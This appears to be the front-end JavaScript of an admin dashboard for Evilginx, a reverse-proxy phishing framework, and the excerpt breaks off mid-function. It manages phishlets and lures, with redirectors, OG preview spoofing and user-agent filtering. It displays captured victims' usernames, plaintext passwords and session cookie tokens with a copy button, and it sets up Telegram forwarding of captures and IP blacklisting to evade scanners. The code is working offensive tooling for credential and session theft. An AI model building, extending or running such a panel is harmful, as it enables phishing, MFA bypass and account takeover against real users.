// ===== Evilginx Admin Dashboard =====

class EvilginxAdmin {
    constructor() {
        this.apiBase = '/api';
        this.currentPage = 'dashboard';
        this.refreshInterval = null;
        
        this.init();
    }

    async init() {
        // Check authentication
        const isAuth = await this.checkAuth();
        if (isAuth) {
            this.showDashboard();
            this.loadDashboard();
        } else {
            this.showLogin();
        }

        this.bindEvents();
    }

    bindEvents() {
        // Login form
        document.getElementById('login-form').addEventListener('submit', (e) => {
            e.preventDefault();
            this.login();
        });

        // Logout
        document.getElementById('logout-btn').addEventListener('click', () => {
            this.logout();
        });

        // Navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', () => {
                const page = item.dataset.page;
                this.navigateTo(page);
            });
        });

        // Modal close
        document.querySelector('.modal-close').addEventListener('click', () => {
            this.closeModal();
        });
        document.querySelector('.modal-backdrop').addEventListener('click', () => {
            this.closeModal();
        });

        // Create lure button
        document.getElementById('create-lure-btn').addEventListener('click', () => {
            this.showCreateLureModal();
        });

        // Delete all sessions
        document.getElementById('delete-all-sessions-btn').addEventListener('click', () => {
            this.confirmDeleteAllSessions();
        });

        // Config form inputs - auto save on change
        ['cfg-domain', 'cfg-external-ip', 'cfg-bind-ip', 'cfg-unauth-url'].forEach(id => {
            document.getElementById(id).addEventListener('change', (e) => {
                this.updateConfig(id.replace('cfg-', '').replace('-', '_'), e.target.value);
            });
        });

        document.getElementById('cfg-autocert').addEventListener('change', (e) => {
            this.updateConfig('autocert', e.target.checked ? 'true' : 'false');
        });

        // Blacklist mode
        document.querySelectorAll('input[name="blacklist"]').forEach(radio => {
            radio.addEventListener('change', (e) => {
                this.updateBlacklist(e.target.value);
            });
        });

        // Proxy form
        document.getElementById('proxy-form').addEventListener('submit', (e) => {
            e.preventDefault();
            this.saveProxySettings();
        });

        // Telegram form
        document.getElementById('telegram-form').addEventListener('submit', (e) => {
            e.preventDefault();
            this.saveTelegramSettings();
        });

        // Telegram test button
        document.getElementById('telegram-test-btn').addEventListener('click', () => {
            this.testTelegramSettings();
        });

        // Security settings form
        document.getElementById('security-settings-form').addEventListener('submit', (e) => {
            e.preventDefault();
            this.saveSecuritySettings();
        });

        // Test IP button
        document.getElementById('test-ip-btn').addEventListener('click', () => {
            this.testIP();
        });

        // Add blocked range button
        document.getElementById('add-blocked-range-btn').addEventListener('click', () => {
            this.showAddBlockedRangeModal();
        });

        // Add whitelist button
        document.getElementById('add-whitelist-btn').addEventListener('click', () => {
            this.showAddWhitelistModal();
        });
    }

    // ===== API Methods =====
    async apiRequest(endpoint, options = {}) {
        try {
            const response = await fetch(`${this.apiBase}${endpoint}`, {
                ...options,
                headers: {
                    'Content-Type': 'application/json',
                    ...options.headers
                }
            });
            return await response.json();
        } catch (error) {
            console.error('API Error:', error);
            return { success: false, message: 'Network error' };
        }
    }

    async checkAuth() {
        const result = await this.apiRequest('/check-auth');
        return result.success;
    }

    async login() {
        const apiKey = document.getElementById('api-key').value;
        const result = await this.apiRequest('/login', {
            method: 'POST',
            body: JSON.stringify({ api_key: apiKey })
        });

        if (result.success) {
            this.showDashboard();
            this.loadDashboard();
            this.toast('success', 'Welcome', 'Successfully authenticated');
        } else {
            this.toast('error', 'Authentication Failed', result.message || 'Invalid API key');
        }
    }

    async logout() {
        await this.apiRequest('/logout', { method: 'POST' });
        this.showLogin();
        if (this.refreshInterval) {
            clearInterval(this.refreshInterval);
        }
    }

    // ===== UI Methods =====
    showLogin() {
        document.getElementById('login-screen').classList.remove('hidden');
        document.getElementById('dashboard').classList.add('hidden');
    }

    showDashboard() {
        document.getElementById('login-screen').classList.add('hidden');
        document.getElementById('dashboard').classList.remove('hidden');
        
        // Start auto-refresh
        this.refreshInterval = setInterval(() => {
            this.refreshCurrentPage();
        }, 30000);
    }

    async navigateTo(page) {
        // Check prerequisites before navigation
        if (page === 'phishlets') {
            const configValid = await this.checkBaseConfig();
            if (!configValid) {
                this.showAlert('⚠️ Configuration Required', 
                    'Please configure your Base Domain and IP addresses in the Configuration page first.', 
                    'warning');
                page = 'config';
            }
        }
        
        if (page === 'lures') {
            const configValid = await this.checkBaseConfig();
            if (!configValid) {
                this.showAlert('⚠️ Configuration Required', 
                    'Please complete the Configuration page first (Step 1).', 
                    'warning');
                page = 'config';
            } else {
                const phishletsEnabled = await this.checkEnabledPhishlets();
                if (!phishletsEnabled) {
                    this.showAlert('⚠️ Phishlet Required', 
                        'Please enable and configure at least one Phishlet first (Step 2).', 
                        'warning');
                    page = 'phishlets';
                }
            }
        }

        // Update nav
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
            if (item.dataset.page === page) {
                item.classList.add('active');
            }
        });

        // Update pages
        document.querySelectorAll('.page').forEach(p => {
            p.classList.remove('active');
        });
        document.getElementById(`page-${page}`).classList.add('active');

        this.currentPage = page;
        this.refreshCurrentPage();
    }

    refreshCurrentPage() {
        switch (this.currentPage) {
            case 'dashboard':
                this.loadDashboard();
                break;
            case 'phishlets':
                this.loadPhishlets();
                break;
            case 'lures':
                this.loadLures();
                break;
            case 'sessions':
                this.loadSessions();
                break;
            case 'config':
                this.loadConfig();
                break;
            case 'security':
                this.loadSecurity();
                break;
        }
    }

    // ===== Dashboard =====
    async checkBaseConfig() {
        const result = await this.apiRequest('/config');
        if (!result.success) return false;
        
        const config = result.data;
        return config.domain && config.domain !== '' && 
               config.external_ipv4 && config.external_ipv4 !== '';
    }

    async checkEnabledPhishlets() {
        const result = await this.apiRequest('/phishlets');
        if (!result.success) return false;
        
        const phishlets = result.data.filter(p => !p.is_template);
        return phishlets.some(p => p.enabled && p.hostname && p.hostname !== '');
    }

    showAlert(title, message, type = 'info') {
        const icon = type === 'warning' ? '⚠️' : type === 'error' ? '❌' : 'ℹ️';
        this.toast(type, title, message);
    }

    async loadDashboard() {
        const result = await this.apiRequest('/stats');
        if (!result.success) return;

        const stats = result.data;

        document.getElementById('stat-sessions').textContent = stats.total_sessions;
        document.getElementById('stat-tokens').textContent = stats.captured_tokens;
        document.getElementById('stat-phishlets').textContent = `${stats.active_phishlets}/${stats.total_phishlets}`;
        document.getElementById('stat-lures').textContent = stats.total_lures;
        document.getElementById('sessions-badge').textContent = stats.total_sessions;

        document.getElementById('status-domain').textContent = stats.domain || 'Not set';
        document.getElementById('status-ip').textContent = stats.external_ip || 'Not set';
        document.getElementById('status-blacklist').textContent = stats.blacklist_mode;

        // Recent sessions
        const recentContainer = document.getElementById('recent-sessions');
        if (stats.recent_sessions && stats.recent_sessions.length > 0) {
            recentContainer.innerHTML = stats.recent_sessions.map(s => `
                <div class="session-item">
                    <div class="session-avatar">${(s.username || 'U')[0].toUpperCase()}</div>
                    <div class="session-info">
                        <div class="session-user">${this.escapeHtml(s.username || 'Unknown')}</div>
                        <div class="session-meta">
                            <span>${s.phishlet}</span>
                            <span>${s.remote_addr}</span>
                        </div>
                    </div>
                    <span class="badge ${s.has_tokens ? 'badge-success' : 'badge-muted'} session-badge">
                        ${s.has_tokens ? 'Tokens' : 'No Tokens'}
                    </span>
                </div>
            `).join('');
        } else {
            recentContainer.innerHTML = '<p class="empty-state">No sessions yet</p>';
        }
    }

    // ===== Phishlets =====
    async loadPhishlets() {
        const result = await this.apiRequest('/phishlets');
        if (!result.success) return;

        const tbody = document.getElementById('phishlets-tbody');
        tbody.innerHTML = result.data.map(p => `
            <tr>
                <td>
                    <strong>${this.escapeHtml(p.name)}</strong>
                    ${p.parent_name ? `<br><small style="color: var(--text-muted)">Parent: ${this.escapeHtml(p.parent_name)}</small>` : ''}
                </td>
                <td>
                    <span class="badge ${this.getStatusBadgeClass(p.status)}">${p.status}</span>
                </td>
                <td>
                    <span class="badge ${p.visibility === 'visible' ? 'badge-success' : 'badge-muted'}">${p.visibility}</span>
                </td>
                <td style="font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">
                    ${this.escapeHtml(p.hostname) || '<span style="color: var(--text-muted)">Not set</span>'}
                </td>
                <td>
                    <div class="table-actions">
                        ${p.is_template ? '' : `
                            ${p.status === 'enabled' ? `
                                <button class="btn-icon" onclick="admin.disablePhishlet('${p.name}')" title="Disable">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <rect x="6" y="4" width="4" height="16"/>
                                        <rect x="14" y="4" width="4" height="16"/>
                                    </svg>
                                </button>
                            ` : `
                                <button class="btn-icon" onclick="admin.enablePhishlet('${p.name}')" title="Enable">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <polygon points="5 3 19 12 5 21 5 3"/>
                                    </svg>
                                </button>
                            `}
                            ${p.visibility === 'visible' ? `
                                <button class="btn-icon" onclick="admin.hidePhishlet('${p.name}')" title="Hide">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                                        <line x1="1" y1="1" x2="23" y2="23"/>
                                    </svg>
                                </button>
                            ` : `
                                <button class="btn-icon" onclick="admin.unhidePhishlet('${p.name}')" title="Unhide">
                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                        <circle cx="12" cy="12" r="3"/>
                                    </svg>
                                </button>
                            `}
                            <button class="btn-icon" onclick="admin.showSetHostnameModal('${p.name}', '${this.escapeHtml(p.hostname || '')}')" title="Set Hostname">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
                                    <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
                                </svg>
                            </button>
                            <button class="btn-icon" onclick="admin.showHostsModal('${p.name}')" title="Get Hosts">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
                                    <line x1="8" y1="21" x2="16" y2="21"/>
                                    <line x1="12" y1="17" x2="12" y2="21"/>
                                </svg>
                            </button>
                        `}
                    </div>
                </td>
            </tr>
        `).join('');
    }

    getStatusBadgeClass(status) {
        switch (status) {
            case 'enabled': return 'badge-success';
            case 'template': return 'badge-warning';
            default: return 'badge-muted';
        }
    }

    async enablePhishlet(name) {
        const result = await this.apiRequest(`/phishlets/${name}/enable`, { method: 'POST' });
        if (result.success) {
            this.toast('success', 'Phishlet Enabled', `${name} is now active`);
            this.loadPhishlets();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async disablePhishlet(name) {
        const result = await this.apiRequest(`/phishlets/${name}/disable`, { method: 'POST' });
        if (result.success) {
            this.toast('success', 'Phishlet Disabled', `${name} is now inactive`);
            this.loadPhishlets();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async hidePhishlet(name) {
        const result = await this.apiRequest(`/phishlets/${name}/hide`, { method: 'POST' });
        if (result.success) {
            this.toast('success', 'Phishlet Hidden', `${name} is now hidden`);
            this.loadPhishlets();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async unhidePhishlet(name) {
        const result = await this.apiRequest(`/phishlets/${name}/unhide`, { method: 'POST' });
        if (result.success) {
            this.toast('success', 'Phishlet Visible', `${name} is now visible`);
            this.loadPhishlets();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    showSetHostnameModal(name, currentHostname) {
        this.openModal('Set Hostname', `
            <div class="form-group">
                <label for="phishlet-hostname">Hostname for ${name}</label>
                <input type="text" id="phishlet-hostname" value="${currentHostname}" placeholder="subdomain.yourdomain.com">
                <p class="form-hint">Must end with your base domain</p>
            </div>
        `, `
            <button class="btn btn-secondary" onclick="admin.closeModal()">Cancel</button>
            <button class="btn btn-primary" onclick="admin.setPhishletHostname('${name}')">Save</button>
        `);
    }

    async setPhishletHostname(name) {
        const hostname = document.getElementById('phishlet-hostname').value;
        const result = await this.apiRequest(`/phishlets/${name}/hostname`, {
            method: 'POST',
            body: JSON.stringify({ hostname })
        });
        
        if (result.success) {
            this.toast('success', 'Hostname Updated', `${name} hostname set`);
            this.closeModal();
            this.loadPhishlets();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async showHostsModal(name) {
        const result = await this.apiRequest(`/phishlets/${name}/hosts`);
        if (!result.success) {
            this.toast('error', 'Error', result.message);
            return;
        }

        const hosts = result.data || [];
        this.openModal('Hosts File Entries', `
            <p style="margin-bottom: 1rem; color: var(--text-secondary);">Add these entries to your hosts file for local testing:</p>
            <div class="code-block">${hosts.join('\n') || 'No hosts configured'}</div>
        `, `
            <button class="btn btn-secondary" onclick="admin.closeModal()">Close</button>
            <button class="btn btn-primary" onclick="admin.copyToClipboard(\`${hosts.join('\\n')}\`)">Copy</button>
        `);
    }

    // ===== Lures =====
    async loadLures() {
        const result = await this.apiRequest('/lures');
        if (!result.success) return;

        const tbody = document.getElementById('lures-tbody');
        if (!result.data || result.data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" class="empty-state">No lures created yet</td></tr>';
            return;
        }

        tbody.innerHTML = result.data.map(l => `
            <tr>
                <td>${l.id}</td>
                <td><span class="badge badge-info">${this.escapeHtml(l.phishlet)}</span></td>
                <td style="font-family: 'JetBrains Mono', monospace;">${this.escapeHtml(l.path)}</td>
                <td>
                    ${l.redirector ? 
                        `<span class="badge badge-primary">${this.escapeHtml(l.redirector)}</span>` : 
                        '<span class="badge badge-muted">Off</span>'}
                </td>
                <td>
                    ${l.phish_url ? `
                        <div class="url-display">
                            <span class="url-text" title="${this.escapeHtml(l.phish_url)}">${this.escapeHtml(l.phish_url)}</span>
                            <button class="btn btn-sm btn-ghost copy-btn" onclick="admin.copyToClipboard('${this.escapeHtml(l.phish_url)}')">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                                </svg>
                            </button>
                        </div>
                    ` : '<span style="color: var(--text-muted)">Enable phishlet first</span>'}
                </td>
                <td>
                    ${l.paused_until && l.paused_until > Date.now() / 1000 ? 
                        `<span class="badge badge-warning">Paused</span>` : 
                        `<span class="badge badge-success">Active</span>`}
                </td>
                <td>
                    <div class="table-actions">
                        <button class="btn-icon" onclick="admin.showEditLureModal(${l.id})" title="Edit">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
                                <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
                            </svg>
                        </button>
                        <button class="btn-icon danger" onclick="admin.deleteLure(${l.id})" title="Delete">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <polyline points="3 6 5 6 21 6"/>
                                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
                            </svg>
                        </button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    async showCreateLureModal() {
        // Step 1: Check base configuration
        const configValid = await this.checkBaseConfig();
        if (!configValid) {
            this.showAlert('⚠️ Step 1: Configure Base Settings', 
                'Before creating lures, please configure:\n\n1. Base Domain\n2. External IPv4\n3. Bind IPv4\n\nGo to Configuration page to set these up.', 
                'warning');
            this.navigateTo('config');
            return;
        }

        // Step 2: Check if any phishlets are enabled
        const phishletsResult = await this.apiRequest('/phishlets');
        if (!phishletsResult.success) return;

        const phishlets = phishletsResult.data.filter(p => !p.is_template);
        const enabledPhishlets = phishlets.filter(p => p.enabled && p.hostname && p.hostname !== '');
        
        if (enabledPhishlets.length === 0) {
            this.showAlert('⚠️ Step 2: Enable a Phishlet', 
                'Before creating lures, please:\n\n1. Go to Phishlets page\n2. Enable at least one phishlet\n3. Set its hostname\n\nThen come back to create lures.', 
                'warning');
            this.navigateTo('phishlets');
            return;
        }

        // Fetch available redirectors
        const redirectorsResult = await this.apiRequest('/redirectors');
        const redirectors = redirectorsResult.success ? redirectorsResult.data : [];
        
        this.openModal('Create Lure', `
            <div class="alert alert-info" style="margin-bottom: 1rem; padding: 0.75rem; background: rgba(59, 130, 246, 0.1); border-left: 3px solid #3b82f6; border-radius: 4px;">
                <strong>✓ Ready to create lure</strong><br>
                <small>Configuration and phishlets are set up correctly.</small>
            </div>
            <div class="form-group">
                <label for="lure-phishlet">Phishlet (${enabledPhishlets.length} enabled)</label>
                <select id="lure-phishlet">
                    ${enabledPhishlets.map(p => `<option value="${p.name}">${p.name} (${p.hostname})</option>`).join('')}
                </select>
            </div>
            <div class="form-group">
                <label for="lure-redirector">Redirector (Optional)</label>
                <select id="lure-redirector">
                    <option value="">None</option>
                    ${redirectors.map(r => `<option value="${this.escapeHtml(r)}">${this.escapeHtml(r)}</option>`).join('')}
                </select>
                <p class="form-hint">Choose a loading animation to show before the phishing page</p>
            </div>
        `, `
            <button class="btn btn-secondary" onclick="admin.closeModal()">Cancel</button>
            <button class="btn btn-primary" onclick="admin.createLure()">Create</button>
        `);
    }

    async createLure() {
        const phishlet = document.getElementById('lure-phishlet').value;
        const redirector = document.getElementById('lure-redirector') ? document.getElementById('lure-redirector').value : '';
        
        // Create the lure first
        const result = await this.apiRequest('/lures', {
            method: 'POST',
            body: JSON.stringify({ phishlet })
        });

        if (result.success) {
            // If redirector was selected, update the lure
            if (redirector && redirector !== '') {
                const lureId = result.data.id;
                await this.apiRequest(`/lures/${lureId}`, {
                    method: 'PUT',
                    body: JSON.stringify({ redirector: redirector })
                });
            }
            
            this.toast('success', 'Lure Created', `New lure for ${phishlet}${redirector ? ' with ' + redirector + ' redirector' : ''}`);
            this.closeModal();
            this.loadLures();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async showEditLureModal(id) {
        const result = await this.apiRequest(`/lures/${id}`);
        if (!result.success) return;

        // Fetch available redirectors
        const redirectorsResult = await this.apiRequest('/redirectors');
        const redirectors = redirectorsResult.success ? redirectorsResult.data : [];

        const l = result.data;
        
        // Build redirector options
        const redirectorOptions = redirectors.map(r => 
            `<option value="${this.escapeHtml(r)}" ${l.redirector === r ? 'selected' : ''}>${this.escapeHtml(r)}</option>`
        ).join('');
        
        this.openModal('Edit Lure', `
            <div class="form-group">
                <label for="edit-path">Path</label>
                <input type="text" id="edit-path" value="${this.escapeHtml(l.path)}">
            </div>
            <div class="form-group">
                <label for="edit-hostname">Custom Hostname</label>
                <input type="text" id="edit-hostname" value="${this.escapeHtml(l.hostname || '')}" placeholder="Optional">
            </div>
            <div class="form-group">
                <label for="edit-redirector">Redirector</label>
                <select id="edit-redirector">
                    <option value="" ${!l.redirector ? 'selected' : ''}>Off (No Redirector)</option>
                    ${redirectorOptions}
                </select>
                <p class="form-hint">HTML page shown before phishing page</p>
            </div>
            <div class="form-group">
                <label for="edit-redirect">Redirect URL</label>
                <input type="text" id="edit-redirect" value="${this.escapeHtml(l.redirect_url || '')}" placeholder="https://example.com">
            </div>
            <div class="form-group">
                <label for="edit-info">Info</label>
                <input type="text" id="edit-info" value="${this.escapeHtml(l.info || '')}" placeholder="Description">
            </div>
            <div class="form-group">
                <label for="edit-og-title">OG Title</label>
                <input type="text" id="edit-og-title" value="${this.escapeHtml(l.og_title || '')}">
            </div>
            <div class="form-group">
                <label for="edit-og-desc">OG Description</label>
                <input type="text" id="edit-og-desc" value="${this.escapeHtml(l.og_desc || '')}">
            </div>
            <div class="form-group">
                <label for="edit-og-image">OG Image URL</label>
                <input type="text" id="edit-og-image" value="${this.escapeHtml(l.og_image || '')}">
            </div>
            <div class="form-group">
                <label for="edit-ua-filter">User-Agent Filter (Regex)</label>
                <input type="text" id="edit-ua-filter" value="${this.escapeHtml(l.ua_filter || '')}">
            </div>
        `, `
            <button class="btn btn-secondary" onclick="admin.closeModal()">Cancel</button>
            <button class="btn btn-primary" onclick="admin.saveLure(${id})">Save</button>
        `);
    }

    async saveLure(id) {
        const updates = {
            path: document.getElementById('edit-path').value,
            hostname: document.getElementById('edit-hostname').value,
            redirector: document.getElementById('edit-redirector').value,
            redirect_url: document.getElementById('edit-redirect').value,
            info: document.getElementById('edit-info').value,
            og_title: document.getElementById('edit-og-title').value,
            og_desc: document.getElementById('edit-og-desc').value,
            og_image: document.getElementById('edit-og-image').value,
            ua_filter: document.getElementById('edit-ua-filter').value
        };

        const result = await this.apiRequest(`/lures/${id}`, {
            method: 'PUT',
            body: JSON.stringify(updates)
        });

        if (result.success) {
            this.toast('success', 'Lure Updated', 'Changes saved successfully');
            this.closeModal();
            this.loadLures();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async deleteLure(id) {
        if (!confirm('Are you sure you want to delete this lure?')) return;

        const result = await this.apiRequest(`/lures/${id}`, { method: 'DELETE' });
        if (result.success) {
            this.toast('success', 'Lure Deleted', 'Lure has been removed');
            this.loadLures();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    // ===== Sessions =====
    async loadSessions() {
        const result = await this.apiRequest('/sessions');
        if (!result.success) return;

        const tbody = document.getElementById('sessions-tbody');
        if (!result.data || result.data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="8" class="empty-state">No sessions captured yet</td></tr>';
            return;
        }

        tbody.innerHTML = result.data.map(s => `
            <tr>
                <td>${s.id}</td>
                <td><span class="badge badge-info">${this.escapeHtml(s.phishlet)}</span></td>
                <td style="max-width: 150px; overflow: hidden; text-overflow: ellipsis;">${this.escapeHtml(s.username) || '-'}</td>
                <td style="max-width: 150px; overflow: hidden; text-overflow: ellipsis;">${this.escapeHtml(s.password) || '-'}</td>
                <td>
                    <span class="badge ${s.has_tokens ? 'badge-success' : 'badge-muted'}">
                        ${s.has_tokens ? 'Captured' : 'None'}
                    </span>
                </td>
                <td style="font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">${this.escapeHtml(s.remote_addr)}</td>
                <td style="font-size: 0.85rem; color: var(--text-secondary);">${s.update_time}</td>
                <td>
                    <div class="table-actions">
                        <button class="btn-icon" onclick="admin.showSessionDetails(${s.id})" title="View Details">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </button>
                        <button class="btn-icon danger" onclick="admin.deleteSession(${s.id})" title="Delete">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <polyline points="3 6 5 6 21 6"/>
                                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
                            </svg>
                        </button>
                    </div>
                </td>
            </tr>
        `).join('');
    }

    async showSessionDetails(id) {
        const result = await this.apiRequest(`/sessions/${id}`);
        if (!result.success) {
            this.toast('error', 'Error', result.message);
            return;
        }

        const s = result.data;
        let tokensHtml = '';
        
        if (s.tokens && s.tokens.length > 0) {
            tokensHtml = `
                <div class="form-group">
                    <label>Cookie Tokens (JSON)</label>
                    <div class="code-block" style="max-height: 200px; overflow-y: auto;">${JSON.stringify(s.tokens, null, 2)}</div>
                    <button class="btn btn-sm btn-secondary" style="margin-top: 0.5rem;" onclick="admin.copyToClipboard(\`${JSON.stringify(s.tokens).replace(/`/g, '\\`')}\`)">
                        Copy Tokens
                    </button>
                </div>
            `;
        }

        this.openModal('Session Details', `
            <div class="status-list" style="margin-bottom: 1rem;">
                <div class="status-item">
                    <span class="status-label">Session ID</span>
                    <span class="status-value">${s.id}</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Phishlet</span>
                    <span class="status-value">${this.escapeHtml(s.phishlet)}</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Username</span>
                    <span class="status-value">${this.escapeHtml(s.username) || '-'}</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Password</span>
                    <span class="status-value">${this.escapeHtml(s.password) || '-'}</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Remote IP</span>
                    <span class="status-value">${this.escapeHtml(s.remote_addr)}</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Landing URL</span>
                    <span class="status-value" style="word-break: break-all; font-size: 0.8rem;">${this.escapeHtml(s.landing_url) || '-'}</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Created</span>
                    <span class="status-value">${s.create_time}</span>
                </div>
                <div class="status-item">
                    <span class="status-label">Updated</span>
                    <span class="status-value">${s.update_time}</span>
                </div>
            </div>
            <div class="form-group">
                <label>User Agent</label>
                <div class="code-block" style="font-size: 0.8rem;">${this.escapeHtml(s.user_agent) || '-'}</div>
            </div>
            ${tokensHtml}
        `, `
            <button class="btn btn-secondary" onclick="admin.closeModal()">Close</button>
        `);
    }

    async deleteSession(id) {
        if (!confirm('Are you sure you want to delete this session?')) return;

        const result = await this.apiRequest(`/sessions/${id}`, { method: 'DELETE' });
        if (result.success) {
            this.toast('success', 'Session Deleted', 'Session has been removed');
            this.loadSessions();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async confirmDeleteAllSessions() {
        if (!confirm('Are you sure you want to delete ALL sessions? This cannot be undone.')) return;

        const result = await this.apiRequest('/sessions', { method: 'DELETE' });
        if (result.success) {
            this.toast('success', 'All Sessions Deleted', 'All sessions have been removed');
            this.loadSessions();
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    // ===== Configuration =====
    async loadConfig() {
        // Load general config
        const configResult = await this.apiRequest('/config');
        if (configResult.success) {
            const c = configResult.data;
            document.getElementById('cfg-domain').value = c.domain || '';
            document.getElementById('cfg-external-ip').value = c.external_ipv4 || '';
            document.getElementById('cfg-bind-ip').value = c.bind_ipv4 || '';
            document.getElementById('cfg-unauth-url').value = c.unauth_url || '';
            document.getElementById('cfg-autocert').checked = c.autocert;
        }

        // Load blacklist
        const blResult = await this.apiRequest('/blacklist');
        if (blResult.success) {
            const bl = blResult.data;
            document.querySelector(`input[name="blacklist"][value="${bl.mode}"]`).checked = true;
            document.getElementById('bl-ips').textContent = `${bl.ips} IPs`;
            document.getElementById('bl-masks').textContent = `${bl.masks} Masks`;
        }

        // Load proxy
        const proxyResult = await this.apiRequest('/proxy');
        if (proxyResult.success) {
            const p = proxyResult.data;
            document.getElementById('proxy-enabled').checked = p.enabled;
            document.getElementById('proxy-type').value = p.type || 'http';
            document.getElementById('proxy-address').value = p.address || '';
            document.getElementById('proxy-port').value = p.port || '';
            document.getElementById('proxy-username').value = p.username || '';
            document.getElementById('proxy-password').value = p.password || '';
        }

        // Load Telegram settings
        const telegramResult = await this.apiRequest('/telegram');
        if (telegramResult.success) {
            const t = telegramResult.data;
            document.getElementById('telegram-enabled').checked = t.enabled;
            document.getElementById('telegram-bot-token').value = t.bot_token || '';
            document.getElementById('telegram-chat-id').value = t.chat_id || '';
        }
    }

    async updateConfig(field, value) {
        const result = await this.apiRequest('/config', {
            method: 'POST',
            body: JSON.stringify({ field, value })
        });

        if (result.success) {
            this.toast('success', 'Config Updated', `${field} has been updated`);
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async updateBlacklist(mode) {
        const result = await this.apiRequest('/blacklist', {
            method: 'POST',
            body: JSON.stringify({ mode })
        });

        if (result.success) {
            this.toast('success', 'Blacklist Updated', `Mode set to ${mode}`);
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async saveProxySettings() {
        const settings = {
            enabled: document.getElementById('proxy-enabled').checked,
            type: document.getElementById('proxy-type').value,
            address: document.getElementById('proxy-address').value,
            port: parseInt(document.getElementById('proxy-port').value) || 0,
            username: document.getElementById('proxy-username').value,
            password: document.getElementById('proxy-password').value
        };

        const result = await this.apiRequest('/proxy', {
            method: 'POST',
            body: JSON.stringify(settings)
        });

        if (result.success) {
            this.toast('success', 'Proxy Settings Saved', 'Configuration updated');
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    // ===== Telegram Settings =====
    async loadTelegramSettings() {
        const result = await this.apiRequest('/telegram');
        if (result.success && result.data) {
            document.getElementById('telegram-enabled').checked = result.data.enabled;
            document.getElementById('telegram-bot-token').value = result.data.bot_token || '';
            document.getElementById('telegram-chat-id').value = result.data.chat_id || '';
        }
    }

    async saveTelegramSettings() {
        const settings = {
            enabled: document.getElementById('telegram-enabled').checked,
            bot_token: document.getElementById('telegram-bot-token').value,
            chat_id: document.getElementById('telegram-chat-id').value
        };

        const result = await this.apiRequest('/telegram', {
            method: 'POST',
            body: JSON.stringify(settings)
        });

        if (result.success) {
            this.toast('success', 'Telegram Settings Saved', 'Configuration updated');
        } else {
            this.toast('error', 'Error', result.message);
        }
    }

    async testTelegramSettings() {
        // First save the current settings
        const settings = {
            enabled: document.getElementById('telegram-enabled').checked,
            bot_token: document.getElementById('telegram-bot-token').value,
            chat_id: document.getElementById('telegram-chat-id').value
        };

        if (!settings.bot_token || !settings.chat_id) {
            this.toast('warning', 'Missing Settings', 'Please enter Bot Token and Chat ID first');
            return;
        }

        // Save first
        await this.apiRequest('/telegram', {
            method: 'POST',
            body: JSON.stringify(settings)
        });

        // Then test
        const result = await this.apiRequest('/telegram/test', {
            method: 'POST'
        });

        if (result.success) {
